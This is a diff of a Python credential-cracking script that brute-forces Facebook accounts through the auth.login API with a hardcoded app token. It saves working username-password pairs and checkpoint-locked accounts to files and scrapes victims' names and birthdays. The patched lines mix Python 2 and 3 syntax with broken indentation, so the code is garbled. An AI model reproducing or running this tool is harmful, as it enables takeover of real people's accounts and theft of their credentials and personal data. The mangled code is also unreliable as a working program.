@@ -125,15 +125,36 @@ class crack:
 			param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 			send = json.loads(r.get("https://b-api.facebook.com/method/auth.login", params=param, headers=headers).text)
 			if "session_key" in send or "EAAA" in send:
-				ok+=1
-				open('ok','a').write(user+'|'+pw+'\n')
-				print(f'\r\33[32;1m* --> [OK] {user}|{pw}|{send["access_token"]}\33[37;1m                     \n',end='')
+				print '\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;96m ' +pw+ '        '
+					ok.append(uid+' • '+pw)
+					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
+					save.write('\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(pw)+'\n')
+					save.close()
+					break
 				break
 			elif "www.facebook.com" in send["error_msg"]:
-				cp+=1
-				open('cp','a').write(user+'|'+pw+'\n')
-				print(f'\r\33[1;33m* --> [CP] {user}|{pw}\33[37;1m                      \n',end='')
-				break
+				token = open('login.txt').read()
+						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
+						data = s.get(url).json()
+						nama = data['name']
+						ttl = data['birthday'].replace("/","-")
+						print('\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + ' \033[1;96m◊\033[1;97m ' + ttl)
+						cp.append(uid+'|'+pw+'|'+ttl)
+						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
+						save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+' \033[1;96m◊\033[1;97m '+ttl+'\n')
+						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, pw, ttl))
+						save.close()
+						break
+					except(KeyError, IOError):
+						ttl = ' '
+					except:pass
+					print '\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + '        '
+					cp.append(uid+'|'+pw)
+					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
+					save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
+					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, pw))
+					save.close()
+					break
 				
 	def kirim(self):
 		self.jalan(f"\n[=] Total Semua ID: {str(len(id))}")
